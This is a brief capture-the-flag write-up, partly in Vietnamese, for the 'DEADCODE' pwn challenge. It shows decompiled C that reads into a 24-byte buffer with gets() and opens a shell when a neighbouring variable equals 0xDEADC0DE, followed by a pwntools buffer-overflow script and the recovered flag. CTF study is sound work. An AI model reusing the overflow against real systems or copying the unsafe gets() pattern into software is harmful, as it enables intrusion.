# DEADCODE
Hàm main fuction
```sh
char v4[24]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = 0LL;
  buffer_init(argc, argv, envp);
  puts("\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.");
  puts("\nWhat features would you like to see in my app?");
  gets(v4);
  if ( v5 == 3735929054LL )
  {
    puts("\n\nMaybe this code isn't so dead...");
    system("/bin/sh");
  }
  return 0;
```
Chỉ cần đè V5 = 0xDEADC0DE, lấy được flag
```sh
from pwn import *
s = process("./deadcode")
#server
s = remote("pwn-2021.duc.tf", 31916)
s.sendline("a"*24+p64(0xDEADC0DE))
s.interactive()
```
### FLAG >> DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}